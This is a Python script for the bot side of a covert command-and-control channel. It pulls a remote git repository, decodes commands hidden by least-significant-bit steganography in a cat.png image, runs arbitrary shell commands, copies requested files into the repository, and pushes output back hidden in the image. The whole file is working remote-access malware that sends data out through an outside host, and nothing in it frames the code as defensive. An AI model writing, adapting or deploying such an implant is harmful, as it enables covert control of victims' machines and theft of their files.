
from PIL import Image
from git import Repo
import os
import subprocess

cur_path = os.path.dirname(os.path.realpath(__file__))
repo_path = cur_path + "/5f6e9ef9fe8a3a54b74dff0c94fd61e1"
 

# Python program implementing Image Steganography taken from https://www.geeksforgeeks.org/image-based-steganography-using-python/

def genData(data):
        newd = []
        for i in data:
            newd.append(format(ord(i), '08b'))
        return newd

def modPix(pix, data):
    datalist = genData(data)
    lendata = len(datalist)
    imdata = iter(pix)
    for i in range(lendata):
        pix = [value for value in imdata.__next__()[:3] +
                                imdata.__next__()[:3] +
                                imdata.__next__()[:3]]
        for j in range(0, 8):
            if (datalist[i][j] == '0' and pix[j]% 2 != 0):
                pix[j] -= 1
 
            elif (datalist[i][j] == '1' and pix[j] % 2 == 0):
                if(pix[j] != 0):
                    pix[j] -= 1
                else:
                    pix[j] += 1
                # pix[j] -= 1

        if (i == lendata - 1):
            if (pix[-1] % 2 == 0):
                if(pix[-1] != 0):
                    pix[-1] -= 1
                else:
                    pix[-1] += 1
        else:
            if (pix[-1] % 2 != 0):
                pix[-1] -= 1
 
        pix = tuple(pix)
        yield pix[0:3]
        yield pix[3:6]
        yield pix[6:9]
 
def encode_enc(newimg, data):
    w = newimg.size[0]
    (x, y) = (0, 0)
    for pixel in modPix(newimg.getdata(), data):
        newimg.putpixel((x, y), pixel)
        if (x == w - 1):
            x = 0
            y += 1
        else:
            x += 1
 
# Decode the data in the image
def decode():
    image = Image.open(repo_path + "/cat.png", 'r')
 
    data = ''
    imgdata = iter(image.getdata())
 
    while (True):
        pixels = [value for value in imgdata.__next__()[:3] +
                                imgdata.__next__()[:3] +
                                imgdata.__next__()[:3]]
 
        # string of binary data
        binstr = ''
 
        for i in pixels[:8]:
            if (i % 2 == 0):
                binstr += '0'
            else:
                binstr += '1'
 
        data += chr(int(binstr, 2))
        if (pixels[-1] % 2 != 0):
            return data


# git commands
def git_pull():
    repo = Repo(repo_path)
    repo.git.reset('--hard')
    origin = repo.remote(name="origin")
    origin.pull()

def git_push():
    repo = Repo(repo_path)
    repo.git.add(".")
    repo.index.commit("Some commit message")
    origin = repo.remote(name="origin")
    origin.push()


def send(response):
    image = Image.open("cat.png", 'r')
    newimg = image.copy()
    response = "R" + response
    encode_enc(newimg, response)
 
    new_img_name = repo_path + "/cat.png"
    newimg.save(new_img_name, str(new_img_name.split(".")[1].upper()))

    git_push()



if __name__ == '__main__' :
    id = 1 #input("Input bot id: ")

    while True:
        git_pull()
        msg = decode()
        parts = msg.split("|")
        last_part = parts[len(parts)-1]
        body = msg[3:-(len(last_part)+1)]

        # heartbeat
        if msg == "HB|"+str(id):
            # print("sending HB")
            send("1")

        # exec shell command
        if msg[0:2] == "SH" and last_part == str(id):
            result = subprocess.run(body, shell=True, capture_output=True)
            if result.stderr:
                response = result.stderr.decode("utf-8", errors='ignore')
            else:
                response = result.stdout.decode("utf-8", errors='ignore')
            if len(response) > 50000:
                response = response[0:50000]
            send(response)
        
        # copy file
        if msg[0:2] == "CP" and last_part == str(id):
            file_path = body
            file_name = file_path.split("/")
            file_name = file_name[len(file_name)-1]

            result = subprocess.run("cp "+file_path+" "+repo_path, shell=True, capture_output=True)
            if result.stderr:
                response = result.stderr.decode("utf-8", errors='ignore')
                send(response)
            else:
                # file copied to repo -> push + push success message
                git_push()
                send("OK "+file_name)